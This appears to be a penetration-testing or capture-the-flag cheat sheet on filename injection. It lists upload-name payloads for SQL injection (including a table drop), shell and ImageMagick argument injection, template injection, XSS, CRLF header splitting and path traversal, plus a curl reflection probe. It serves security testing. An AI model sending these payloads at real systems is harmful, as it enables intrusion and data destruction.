# Filename Injection — when the name, not the bytes, is the payload

## The name reaches sinks you don't expect

`filename=` is a string field — it flows into logs, emails, SQL queries,
templates, shell commands, response headers, error messages, DOM renders.
The bytes in the file can be empty; the name carries the payload.

## SQL injection via filename

```php
$db->query("INSERT INTO files (name) VALUES ('" . $f['name'] . "')");
```

```
x','x'),('y','y');--
x.png' OR '1'='1
x.png'); DROP TABLE files;--
```

The name escapes quoting — `'` breaks the concat. Detection: a 500 or a
SQL error naming the filename → `web-sqli` for the full attack.

## Command injection via filename — argv reach

`htb-magicom` shape — `convert "uploads/$name"` or `exec("convert $name")`:

```
x.png;id
x.png|id
x.png`id`
x.png$(id)
x.png;cat /flag>/var/www/x.txt
x.png";id;#
x.png' -resize 1x1'         # quote break → option injection
x.png -write /tmp/o.png      # argv option injection (no shell needed!)
```

The `-write`/`+delete`/`-format` argv injection runs without any shell —
ImageMagick/FFmpeg take filenames as arguments and `-option` text is
parsed as flags.

## Template injection via filename — name into a template

```
{{7*7}}.png
<%=7*7%>.png
{{config}}.jpg
${T(java.lang.Runtime)}.png
```

The name renders into a Jinja/Twig/Nunjucks/ERB/OGNL context — listing
pages, alt-text, "your file x uploaded" pages → `web-ssti`.

## XSS via filename — name stored and rendered

```
<img src=x onerror=alert(1)>.png
x.png"><script>alert(1)</script>
x"><img onerror=alert(1) src=x>
```

Filenames render into listing pages, `<img alt>`, error messages, download
`Content-Disposition` headers — a stored-XSS that fires on the admin's
view.

## Log injection / CRLF via filename

```
x.png\r\nX-Injected: y
x.png%0d%0aX-Injected:%20y
```

Into log lines (parsing attacks on the log reader) or into response
headers (`Content-Disposition: attachment; filename="x"` — CRLF splits the
header → `web-request-smuggling`/response-splitting).

## Path normalization — name→path→route

`filename` becomes a URL path in `/files/<name>` endpoints — `..`/`%2e`/
`//`/`%2f` inside the name escapes the route's prefix → the download/
serve endpoint reads outside.

## `Content-Disposition` header injection — the response-side name

`Content-Disposition: attachment; filename="x.png"` — a quote/CRLF inside
the name breaks the header:

```
x.png";foo=bar      — header injection into the disposition
x.png%0d%0aSet-Cookie: x=y  — response splitting
x.png; filename*=UTF-8''... — second filename field
```

## CSV/JSON injection — name into structured output

The app lists files in JSON/CSV exports — `=cmd|` or `","` in the name
breaks the export's structure for downstream consumers.

## The detection probe — where does the name reflect

```bash
curl -F 'f=@x.txt;filename=MARKER_'"$RANDOM"'.txt' $BASE/upload
# then grep the app for the marker in:
#   - the upload response
#   - a files/listing page
#   - error messages
#   - Content-Disposition on a download endpoint
#   - emails/notifications
```

Wherever the marker lands unescaped is an injection surface.

## Falsifiers

- the name is `htmlspecialchars`/`json_encode`/`quote`-escaped at every
  surface AND never reaches a shell/template

## Output to record

- where the name reflected + which injection family it opened
